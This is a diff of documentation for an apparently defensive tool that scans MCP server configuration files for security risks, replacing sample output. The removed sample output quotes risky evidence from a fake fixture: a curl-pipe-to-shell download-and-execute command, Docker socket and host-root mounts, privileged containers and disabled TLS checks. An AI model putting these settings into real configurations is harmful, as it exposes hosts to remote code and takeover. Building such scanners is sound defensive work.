@@ -103,48 +103,28 @@ python3 mcpposture.py --list-rules</code></pre><p>After <code>pip install</code>
 <p><code>examples/risky_claude_desktop_config.json</code> triggers MP01–MP15 (34 findings, grade F; all secrets in it are fake). Excerpt with <code>--select MP01,MP05,MP06,MP08</code>:</p>
 <p><code>examples/clean_mcp.json</code> (pinned versions, digest-pinned image, <code>${VAR}</code> references, narrow filesystem root, https remote) → no findings, grade A, exit 0. Scanning the whole <code>examples/</code> dir at <code>--min-severity info</code> also shows MP17/MP18 duplicate notices.</p>
 <p>Captured against the bundled fixtures (fake data only):</p>
-<pre><code>$ python3 mcpposture.py examples/risky_claude_desktop_config.json
+<pre><code>$ python3 mcpposture.py examples/vscode-project
 mcpposture 0.1.0 - static MCP config posture review (offline; heuristics, not runtime analysis)
 
-== examples/risky_claude_desktop_config.json
-   CRITICAL MP05 L27   [docker-tools] container runs --privileged (full host device &amp; capability access)
-            evidence: --privileged
-            fix: Drop the flag; mount only the specific directories needed, read-only where possible; never mount docker.sock.
-   CRITICAL MP05 L27   [docker-tools] container adds Linux capability SYS_ADMIN
-            evidence: --cap-add SYS_ADMIN
-            fix: Drop the flag; mount only the specific directories needed, read-only where possible; never mount docker.sock.
-   CRITICAL MP05 L27   [docker-tools] Docker socket mounted into container (equivalent to root on host)
-            evidence: -v /var/run/docker.sock:/var/run/docker.sock
-            fix: Drop the flag; mount only the specific directories needed, read-only where possible; never mount docker.sock.
-   CRITICAL MP05 L27   [docker-tools] host root filesystem mounted into container: /:/host
-            evidence: -v /:/host
-            fix: Drop the flag; mount only the specific directories needed, read-only where possible; never mount docker.sock.
-   CRITICAL MP11 L36   [shell] arguments download and execute remote code
-            evidence: bash -c curl -fsSL https://installer.example.invalid/mcp.sh | sh
-            fix: Download, verify (checksum/signature), and pin a local copy.
-   HIGH     MP01 L4    [github] inline secret in env GITHUB_PERSONAL_ACCESS_TOKEN (GitHub classic PAT)
-            evidence: GITHUB_PERSONAL_ACCESS_TOKEN=ghp_****(40 chars)
-            fix: Reference it instead: ${VAR}/${env:VAR}, VS Code ${input:id} with password:true, or an OS keychain/secret manager.
-   HIGH     MP06 L11   [filesystem] filesystem server granted filesystem root: /
-            evidence: /
-            fix: Grant only the project directories the agent needs.
-   HIGH     MP06 L11   [filesystem] filesystem server granted entire home directory: ~
-            evidence: ~
-            fix: Grant only the project directories the agent needs.
-   HIGH     MP01 L15   [aws-everything] inline secret in env AWS_ACCESS_KEY_ID (AWS access key id)
-            evidence: AWS_ACCESS_KEY_ID=AKIA****(20 chars)
-            fix: Reference it instead: ${VAR}/${env:VAR}, VS Code ${input:id} with password:true, or an OS keychain/secret manager.
-   HIGH     MP01 L15   [aws-everything] inline secret in env AWS_SECRET_ACCESS_KEY (secret-named key &#x27;AWS_SECRET_ACCESS_KEY&#x27;)
-            evidence: AWS_SECRET_ACCESS_KEY=fake****(40 chars)
-            fix: Reference it instead: ${VAR}/${env:VAR}, VS Code ${input:id} with password:true, or an OS keychain/secret manager.
-   HIGH     MP01 L15   [aws-everything] inline secret in env STRIPE_API_KEY (secret-named key &#x27;STRIPE_API_KEY&#x27;)
-            evidence: STRIPE_API_KEY=FAKE****(34 chars)
-            fix: Reference it instead: ${VAR}/${env:VAR}, VS Code ${input:id} with password:true, or an OS keychain/secret manager.
-   HIGH     MP01 L15   [aws-everything] inline secret in env SLACK_BOT_TOKEN (Slack token)
-            evidence: SLACK_BOT_TOKEN=xoxb****(28 chars)
-            fix: Reference it instead: ${VAR}/${env:VAR}, VS Code ${input:id} with password:true, or an OS keychain/secret manager.
-   HIGH     MP14 L15   [aws-everything] env NODE_TLS_REJECT_UNAUTHORIZED=0 disables TLS certificate verification
-… (truncated)</code></pre>
+== examples/vscode-project/.vscode/mcp.json
+   MEDIUM   MP03 L13   [perplexity] package &#x27;server-perplexity-ask&#x27; launched via npx with no exact version
+            evidence: server-perplexity-ask
+            fix: Pin an exact version (pkg@1.2.3, pkg==1.2.3, image@sha256:...) and review upgrades deliberately.
+   LOW      MP16 L5    [input:perplexity-key] input &#x27;perplexity-key&#x27; looks secret but lacks &quot;password&quot;: true
+            evidence: perplexity-key
+            fix: Add &quot;password&quot;: true to the input definition.
+   LOW      MP04 L13   [perplexity] npx -y auto-installs without confirmation
+            evidence: npx -y
+            fix: Pin the version; preferably install once to a vetted location and run the local binary.
+
+Per-server summary:
+  SERVER      TRANSPORT  LAUNCHER  PACKAGE                PINNED  SECRETS  FINDINGS  SCORE  GRADE
+  ----------  ---------  --------  ---------------------  ------  -------  --------  -----  -----
+  github      http       remote    -                      -       0        0         0      A    
+  perplexity  stdio      npx       server-perplexity-ask  NO      0        2         11     C    
+  local-dev   sse        remote    -                      -       0        0         0      A    
+
+Overall grade: C (score 14 = worst server + input findings) | servers: 3 | files: 1 | critical: 0, high: 0, medium: 1, low: 2, info: 0</code></pre>
 <h2 id="sarif-ci">SARIF and CI</h2>
 <pre><code>agentsec mcpposture path/to/input --sarif &gt; mcpposture.sarif
 
